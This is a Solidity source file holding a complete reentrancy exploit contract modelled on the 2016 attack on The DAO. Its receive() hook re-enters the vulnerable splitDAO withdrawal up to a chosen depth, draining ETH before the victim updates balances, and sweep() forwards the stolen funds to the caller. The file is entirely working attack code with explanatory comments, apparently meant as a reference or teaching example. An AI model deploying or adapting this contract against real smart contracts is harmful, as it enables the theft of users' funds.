// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ITheDAO {
    function splitDAO(uint256 amount) external;
}

/// @title Attacker
/// @notice Reference exploit contract for The DAO (2016) reentrancy. `attack`
///         calls `splitDAO(amount)`; the vulnerable contract sends `amount` ETH
///         to this contract via a low-level `.call` **before** burning the
///         token balance, so the `receive()` hook re-enters `splitDAO` while
///         the balance is still intact. Every reentrant level extracts another
///         `amount` of ETH, draining the DAO far beyond what a single,
///         non-reentrant withdrawal could reach.
contract Attacker {
    ITheDAO public immutable dao;
    uint256 public amount;
    uint256 public maxDepth;
    uint256 public depth;

    constructor(address dao_) {
        dao = ITheDAO(dao_);
    }

    /// @notice Kick off the reentrant drain. This contract must already hold
    ///         `amount_` DAO tokens (it is the `msg.sender` of `splitDAO`).
    function attack(uint256 amount_, uint256 maxDepth_) external {
        amount = amount_;
        maxDepth = maxDepth_;
        depth = 0;
        dao.splitDAO(amount_);
    }

    /// @dev The vulnerable `splitDAO` sends ETH here before settling the
    ///      balance; re-enter `splitDAO` up to `maxDepth` times.
    receive() external payable {
        if (depth < maxDepth) {
            depth += 1;
            dao.splitDAO(amount);
        }
    }

    /// @notice Convenience: sweep drained ETH back to the caller (EOA).
    function sweep() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
